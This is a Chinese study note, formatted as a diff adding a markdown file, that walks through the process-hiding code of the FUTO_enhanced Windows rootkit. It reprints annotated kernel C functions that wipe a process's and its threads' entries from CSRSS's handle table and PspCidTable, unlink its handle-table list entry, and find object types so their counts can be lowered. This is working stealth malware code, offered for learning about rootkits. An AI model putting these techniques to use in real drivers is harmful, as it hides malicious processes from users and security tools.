@@ -1,0 +1,317 @@
+
+# FUTO\_enhanced 点滴笔记
+
+> 原文：[`www.pediy.com/kssd/pediy10/59832.html`](https://www.pediy.com/kssd/pediy10/59832.html)
+
+`FUTO_enhanced`放在硬盘里快半年了没有去看过，玩内核的大牛们在几年前就把这个古老的`rootkit`玩腻了，而俺作为后来的小菜今天才开始消化这些过时的知识（无奈啊，差距太大了！）。
+
+网上关于这个`rootkit`的介绍很详细了，源码也是很值得俺学习。于是就写点学习的东西供以后接触的同学一个参考。老鸟们直接`pass`了~
+
+**前置知识**：
+
+句柄表的详细结构和查询过程、`WINDOWS`的对象管理机制和结构、进程线程的结构和它们内部变量间的若干联系、`IS`等`anti-rootkit`的基本原理...
+
+关于`PspCidTable`已经有好多介绍，它也是很重要的一个节点。`FUTO`理所当然会抹掉里面相应的进程/线程对象信息了。而`CSRSS.exe`中同样保留有一份完整的系统进程/线程表。所以要一并抹掉。
+
+可以参考`WINDOWS INTERNALS`的第八章，里面有进程创建和相关结构的详细介绍（英文版）
+
+### (1) 抹掉 `CSRSS.exe` 中指定进程的 `object`
+
+首先遍历`EPROCESS`链表找到`CSRSS.exe`，其偏移`+0x0c4`处的`ObjectTable`为`HANDLE_TABLE`结构，其第一项`+0x00`处便是我们熟悉的`TableCode`了。就是要在这个句柄表中找到要抹掉的进程对象，为了兼容，`FUTO`分了2种情况：`XP SP2/WIN2K3`和`WIN2K`，前者的句柄表是1~3层，后者就是3层。这里只看`XP`下的：
+
+```c
+void EraseHandle (
+   PEPROCESS eproc,
+   PVOID tarHandle
+   )
+/*++
+sudami 注解 08/02/18
+参数：
+   eproc - 一般就是 CSRSS.EXE 的 EPROCESS 了,因为其他进程里面没有全部的信息
+   tarHandle - 为要抹掉的进程 EPROCESS 或线程 ETHREAD; handle 在 R3 是 PVOID 类型
+               到了底层,就是指向相应的结构对象的指针
+返回：NULL
+功能：
+   在 CSRSS.EXE 中抹掉指定进程/线程的对象信息.作者定义的结构体 TABLE_ENTRY
+   没有给全,也比较的含糊,其实就是_HANDLETABLEENTRY 结构的一部分 - -
+   typedef struct _TABLE_ENTRY {
+       DWORD object;             // +0x000 Object
+       ACCESS_MASK security;     // +0x004 GrantedAccess
+   } TABLE_ENTRY, *PTABLE_ENTRY, **PPTABLE_ENTRY, ***PPPTABLE_ENTRY;
+   当然也可以不用它的这个结构体,不用 3 维数组.结合 0x800 在第 1 和第 2 张表中遍历
+--*/
+{
+   PTABLE_ENTRY    orig_tableEntry, p_tableEntry, *pp_tableEntry, **ppp_tableEntry;
+   int a, b, c;
+   int i_numHandles, i_hperPage;  
+   int i_handle;
+   orig_tableEntry = (PTABLE_ENTRY)*(PDWORD) (( *(PDWORD) 
+     ( (DWORD)eproc + 0x0c4 ) ));
+   i_numTables = ((DWORD)orig_tableEntry & 3);
+   if (b_isXP2K3 == TRUE) {
+      i_hperPage = PAGE_SIZE/sizeof(TABLE_ENTRY);   
+      if (i_numTables == 0) { // 0 层表
+        // 这个地方应该是 0xfffffffc,去掉 TableCode 的低 2 位,不知道作者怎么写成这样了 =。=!
+        p_tableEntry = (PTABLE_ENTRY)( (DWORD)orig_tableEntry & 0xfffffff8 );
+        for (a = 0; a < i_hperPage; a++) {//去掉低 3 位掩码标志 0x18 为 ObjectHeader 的大小
+          if (((p_tableEntry[a].object ^ 0x80000000) & 0xfffffff8) ==
+             ((DWORD)tarHandle - 0x18)) { // 填充 0 即可
+             p_tableEntry[a].object = 0;
+             p_tableEntry[a].security = 0;
+           }
+        }
+      } else if (i_numTables == 1) { // 1 层表
+        pp_tableEntry = (PPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffffc);
+        for (a = 0; a < i_hperPage; a++) {
+          if (pp_tableEntry[a] == NULL)
+            break;
+          for (b = 0; b < i_hperPage; b++) { // 2 维数组了
+            if (((pp_tableEntry[a][b].object ^ 0x80000000) & 0xfffffff8) 
+               == ((DWORD)tarHandle - 0x18)) {
+               pp_tableEntry[a][b].object = 0;
+               pp_tableEntry[a][b].security = 0;
+             }
+           }
+        }
+      } else if (i_numTables == 2) { // 2 层表
+        ppp_tableEntry = (PPPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
+        for (a = 0; a < i_hperPage; a++) {
+          if (ppp_tableEntry[a] == NULL)
+            break;
+          for (b = 0; b < i_hperPage; b++) {
+            if (ppp_tableEntry[a][b] == NULL)
+              break;
+            for (c = 0; c < i_hperPage; c++) { // 3 维数组了
+              if (((ppp_tableEntry[a][b][c].object ^ 0x80000000) 
+                 & 0xfffffff8) == ((DWORD)tarHandle - 0x18)) {
+                 ppp_tableEntry[a][b][c].object = 0;
+                 ppp_tableEntry[a][b][c].security = 0;
+               }
+             }
+           }
+        }
+      }
+   } else if (b_isXP2K3 == FALSE) {
+    // WIN2K 的略掉了...   
+   }
+}
+```
+
+### (2) 抹 `PspCidTable` 中指定进程的 `object`
+
+和上面的差不多。只不过上面是指定进程（`CSRSS.EXE`）中的`HANDLE_TABLE`中的指定进程/线程对象。而这个是直接给出了`PspCidTable`，更方便 ---> 调用自定义函数`EraseObjectFromTable`略过
+
+### (3) 断 2 个链。一个是 `ActiveProcessLinks`，一个是 要隐藏进程 `EPROCESS` 结构中的另一个链
+
+`nt!_HANDLE_TABLE`
+
+```
++0x000 TableCode         : Uint4B
++0x004 QuotaProcess      : Ptr32 _EPROCESS
++0x008 UniqueProcessId   : Ptr32 Void
++0x00c HandleTableLock   : [4] _EX_PUSH_LOCK
++0x01c HandleTableList   : _LIST_ENTRY
++0x024 HandleContentionEvent : _EX_PUSH_LOCK
++0x028 DebugInfo         : Ptr32 _HANDLE_TRACE_DEBUG_INFO
++0x02c ExtraInfoPages    : Int4B
++0x030 FirstFree         : Uint4B
++0x034 LastFree          : Uint4B
++0x038 NextHandleNeedingPool : Uint4B
++0x03c HandleCount       : Int4B
++0x040 Flags             : Uint4B
++0x040 StrictFIFO        : Pos 0, 1 Bit
+```
+
+即 `EPROCESS` -> `ObjectTable` (`+0x0c4`) -> `handleTableList`；它要是不断，别人可以通过别的已知进程推出这个隐藏进程的`EPROCESS`，很危险！
+
+```c
+void UnHookHandleListEntry (
+   PEPROCESS eproc
+   )
+/*++
+sudami 注解 08/02/18
+参数：
+   eproc - 为要抹掉的进程 EPROCESS
+返回：NULL
+功能：
+   摘除隐藏在 EPROCESS-->ObjectTable-->handleTableList 里的结点 
+--*/
+{
+   PLIST_ENTRY plist_hTable = NULL;
+   plist_hTable = (PLIST_ENTRY)((*(PDWORD)((DWORD) eproc + HANDLETABLEOFFSET)) + 0x01c);
+   // 数据结构的知识:双向链表中的摘除结点. 注意 "\*((DWORD *) XXXX)" 的意思是取 XXXX
+   // 所指向地址处的内容,即取出保存有下个/上个结点的地址; 而"(DWORD)" 表明就是地址
+   *((DWORD *)plist_hTable->Blink)    = (DWORD) plist_hTable->Flink;
+   *((DWORD *)plist_hTable->Flink+1) = (DWORD) plist_hTable->Blink;
+}
+```
+
+### (4) 抹掉 `CSRSS.EXE` 中指定进程的所有线程对象。
+
+哈哈，感觉和`PHIDE2`里面的嫁接新的线程切换表头有点儿像。其实就是遍历要隐藏进程的所有线程，对每个线程都调用前面提到的`EraseHandle`来抹掉即可
+
+```c
+void HideThreadsInTargetProcess (
+   PEPROCESS eproc, 
+   PEPROCESS target_eproc
+   )
+/*++
+sudami 注解 08/02/18
+参数：
+   eproc - 为要抹掉的进程 EPROCESS
+   target_eproc - CSRSS.EXE
+返回：NULL
+功能：
+   摘除 CSRSS.EXE 中指定进程的所有线程对象信息
+--*/
+{
+   PETHREAD start, walk;
+   DWORD     check1, check2;
+   if (eproc == NULL)
+    return;
+   // nt!_KPROCESS +0x050 ThreadListHead    : _LIST_ENTRY
+   check1 = *(DWORD *) ( (DWORD)eproc + 0x50 );  
+   check2 = ( (DWORD)eproc + 0x50 );
+   if (check1 == check2) // 若该进程只有一个主线程就不必了
+    return;
+   start = *(PETHREAD *) ( (DWORD)eproc + 0x50 );
+   start = (PETHREAD) ( (DWORD)start - 0x50 );
+   walk = start;
+   do {
+      EraseHandle (target_eproc, walk); // 抹掉 each ethread
+      // nt!_KTHREAD +0x1b0 ThreadListEntry   : _LIST_ENTRY
+      walk = *(PETHREAD *)((DWORD)walk + 0x1b0);
+      walk = (PETHREAD)((DWORD)walk - 0x1b0);
+    } while (walk != start);
+}
+```
+
+### (5) 抹掉 `PspCidTable` 中的指定进程的所有线程对象
+
+和上面一样，只是把`EraseHandle`换成`EraseObjectFromTable`
+
+### (6) 使进程对象这类型结构的计数减 1
+
+`FUTO`中给出了一个很好的函数来得到指定的对象类型。`ObjectType`有27种，模样都是`L"\\ObjectTypes\\XXXX"`。打开对象获得句柄，进而获得`OBJECT_DIRECTORY`的地址，对其中的37组`OBJECT_DIRECTORY_ENTRY`进行搜索，每一组都是相同`hash`值的一条链。遍历起来也很容易。最终找到指定类型的`OBJECT_TYPE`
+
+`ObOpenObjectByName` -> `ObReferenceObjectByHandle`
+
+（传递`\\ObjectTypes`得到`handle`） (通过`handle`得到对象地址)
+
+-> `ObQueryNameString`，然后比较`name`...
+
+然后`OBJECT_TYPE`中的`TotalNumberOfObjects`自减即可
+
+
+
+```c
+POBJECT\_TYPE 
+FindObjectTypes (char *ac\_tName)
+{
+OBJECT\_ATTRIBUTES ObjectAttributes;
+UNICODE\_STRING ucName, ufName;
+ANSI\_STRING afName;
+NTSTATUS ntStatus;
+HANDLE hDirectory = NULL;
+POBJECT\_DIRECTORY pDirectoryObject = NULL;
+POBJECT\_DIRECTORY\_ENTRY DirectoryEntry;
+POBJECT\_HEADER objHead;
+ULONG Bucket = 0;
+DWORD d\_size;
+PUNICODE\_STRING p\_wcName;
+
+p\_wcName = (PUNICODE\_STRING) ExAllocatePool(PagedPool, \\
+    sizeof(UNICODE\_STRING)+(sizeof(WCHAR)\*1024));
+if (p\_wcName == NULL)
+    return NULL;
+
+p\_wcName->Length = 0;
+p\_wcName->MaximumLength = 1022;
+p\_wcName->Buffer = (PWSTR)((DWORD)p\_wcName + sizeof(UNICODE\_STRING));
+
+RtlInitAnsiString(&afName, ac\_tName);
+       
+// open driver directory in the object directory
+RtlInitUnicodeString(&ucName,L"\\ObjectTypes");
+InitializeObjectAttributes(&ObjectAttributes,&ucName,OBJ\_CASE\_INSENSITIVE,NULL,NULL);
+ntStatus = ObOpenObjectByName(&ObjectAttributes,
+                              NULL,
+                              KernelMode,
+                              NULL,
+                              0x80000000,
+                              NULL,
+                              &hDirectory);
+if (!NT\_SUCCESS (ntStatus))
+    return NULL;
+
+// get pointer from handle
+ntStatus = ObReferenceObjectByHandle(hDirectory,
+                                     FILE\_ANY\_ACCESS,
+                                     NULL,
+                                     KernelMode,
+                                     &pDirectoryObject,
+                                     NULL);
+ZwClose (hDirectory);
+if (!NT\_SUCCESS (ntStatus))
+    return NULL;
+
+ntStatus = RtlAnsiStringToUnicodeString(&ufName, &afName, TRUE);
+if (!NT\_SUCCESS (ntStatus))
+    return NULL;
+    
+// walk the object directory
+for (Bucket = 0; Bucket < NUMBER\_HASH\_BUCKETS; Bucket++) 
+{
+    DirectoryEntry = pDirectoryObject->HashBuckets\[Bucket\];
+    while (DirectoryEntry != NULL)
+    {
+        ntStatus = ObQueryNameString(DirectoryEntry->Object, 
+                                      (POBJECT\_NAME\_INFORMATION) p\_wcName, 
+                                      p\_wcName->MaximumLength, 
+                                      &d\_size);
+        if (NT\_SUCCESS (ntStatus))
+        {
+            if (RtlCompareUnicodeString(p\_wcName, &ufName, TRUE)==0)
+            {
+                if (pDirectoryObject)
+                    ObDereferenceObject(pDirectoryObject);
+                RtlFreeUnicodeString(&ufName);
+                ExFreePool(p\_wcName);
+                return (POBJECT\_TYPE) DirectoryEntry->Object;
+            }
+        }
+        p\_wcName->MaximumLength = 1022;
+        DirectoryEntry = DirectoryEntry->ChainLink;
+    }
+}
+
+if (pDirectoryObject)
+    ObDereferenceObject(pDirectoryObject);
+RtlFreeUnicodeString(&ufName);
+ExFreePool(p\_wcName);
+return NULL;
+}
+```
+
+这只是 `FUTO` 中隐藏进程的部分，做的还是比较系统的。现在看来科普很重要啊。虽然这些东西很简单，但要一个人去 `coding`，还不是件容易事。有源码就要下功夫去汲取营养，有所收获！`img/f43c1e514327696dccbb0da997496b2a.jpg`
+
+里面还有个是抹掉`PsLoadedModuleList`链中关于`Driver`的信息。其他的就是什么设置`SID`、`ProcessToken`之类的，有点儿烦琐。
+
+然后 `R3` 部分负责发 `IRP` 到 `R0` 中，就是传递个进程 `ID`，思路还是挺简单的。呵呵，写了点儿很烂的东西，希望对没有学过这个古老的 `rootkit` 的同学有点儿帮助！`img/9d43c9aee695f95b024aafd1b69ffa5a.jpg`
+
+-------------------------------------------------------------------------
+
+### 参考资料
+
+1.  [JIURL 玩玩 Win2k 对象](http://blog.csdn.net/iiprogram/archive/2006/04/07/654884.aspx)
+2.  [Windows 2000 的对象管理](http://dev.csdn.net/Develop/article/28/70543.shtm)
+3.  [Windows 对象 (Object) 的组织](http://www.phpfav.com/?p=83)
+4.  `WRK1.2` `Windbg`
+
+### 上传的附件
+
+| `img/c8c74a380a3dea7fa2460187d80ee5e0.jpg` | `FUTo\_enhanced.rar` |
+| :--- | :--- |
+
+| `img/c8c74a380a3dea7fa2460187d80ee5e0.jpg` | `Inside WINDOWS NT Object Manager.rar` |
+| :--- | :--- |
